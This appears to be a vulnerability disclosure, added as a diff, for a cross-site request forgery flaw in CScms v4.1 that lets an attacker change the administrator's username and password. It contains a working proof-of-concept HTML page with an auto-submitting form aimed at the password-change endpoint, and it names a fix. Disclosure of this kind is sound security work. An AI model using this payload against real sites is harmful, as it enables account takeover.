@@ -1,0 +1,31 @@
+There is a CSRF(Cross Site Request Forgery) security vulnerablity in CScms v4.1
+
+Description:
+An issue was discovered in CScms v4.1.
+Cross-site request forgery (CSRF) vulnerability in /cscms4.1/plugins/sys/admin/Sys.php allow remote attackers to change
+administrator's username and password.
+
+Triggering condition: Administrator clicks on malicious link
+
+The Cause of the vulnerability:
+In 151th of Sys.php script:
+We can find that this script does not have an anti-csrf mechanism.
+
+Poc:
+Logined administrator clicks the url:http://192.168.232.12/evil.html
+
+payload:http://127.0.0.1/cscms4.1/admin.php/sys/editpass_save
+
+evil.html:
+<form action="http://127.0.0.1/cscms4.1/admin.php/sys/editpass_save" method="POST">
+	<input type="text" name="adminname" value="test">
+	<input type="text" name="adminpass" value="1234567">
+</form>
+<script> document.forms[0].submit(); </script> 
+
+Precautions:
+After the implementation of the poc, although the page only shows json data, it has succeeded and can verify itself.
+In addition, the verification code for background login can also be attacked by csrf. Please forge your own form
+
+Repair method:
+Join the random token check
